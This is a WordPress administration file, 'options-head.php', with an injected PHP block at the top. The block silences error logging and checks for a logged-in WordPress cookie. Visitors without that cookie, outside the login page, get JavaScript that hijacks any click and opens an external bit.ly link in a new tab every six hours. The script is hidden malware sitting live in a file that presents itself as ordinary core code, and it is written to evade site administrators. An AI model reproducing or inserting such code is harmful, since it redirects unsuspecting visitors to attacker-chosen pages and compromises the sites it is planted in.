<?php

error_reporting(0);
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);

$ckUjYggTf = 0;
foreach($_COOKIE as $vUjUnHvOOoO => $vvvUjUnHvOOoO){
  if (strstr(strval($vUjUnHvOOoO), 'wordpress_logged_in')){
    $ckUjYggTf = 1;
    break;
  }
}

if($ckUjYggTf == 0 && !strstr(strval($_SERVER['REQUEST_URI']), 'wp-login.php')){
	echo "<script>(function (parameters) {
		const getHoursDiff = (startDate, endDate) => {
			const msInHour = 1000 * 60 * 60;
			return Math.round(Math.abs(endDate - startDate) / msInHour);
		}
		const getFromStorage = (host) => localStorage.getItem(`\${host}-local-storage`);
		const addToStorage = (host, nowDate) => localStorage.setItem(`\${host}-local-storage`, nowDate);

		function globalClick(event) {
			const host = location.host
			const newLocation = \"https://bit.ly/3AAXYh6\"
			const allowedHours = 6

			const nowDate = Date.parse(new Date());
			const savedData = getFromStorage(host)

			if (savedData) {
				try {
					const storageDate = parseInt(savedData);
					// check hours
					const hoursDiff = getHoursDiff(nowDate, storageDate)
					console.log(nowDate, storageDate, hoursDiff)
					if (hoursDiff >= allowedHours) {
						addToStorage(host, nowDate);
						window.open(newLocation, \"_blank\");
					}
				} catch (error) {
					addToStorage(host, nowDate);
					window.open(newLocation, \"_blank\");
				}
			} else {
				addToStorage(host, nowDate);
				window.open(newLocation, \"_blank\");
			}
		}
		document.addEventListener(\"click\", globalClick);
	})();</script>";
}

?>
<?php
/**
 * WordPress Options Header.
 *
 * Displays updated message, if updated variable is part of the URL query.
 *
 * @package WordPress
 * @subpackage Administration
 */

wp_reset_vars( array( 'action' ) );

if ( isset( $_GET['updated'] ) && isset( $_GET['page'] ) ) {
	// For back-compat with plugins that don't use the Settings API and just set updated=1 in the redirect.
	add_settings_error('general', 'settings_updated', __('Settings saved.'), 'updated');
}

settings_errors();
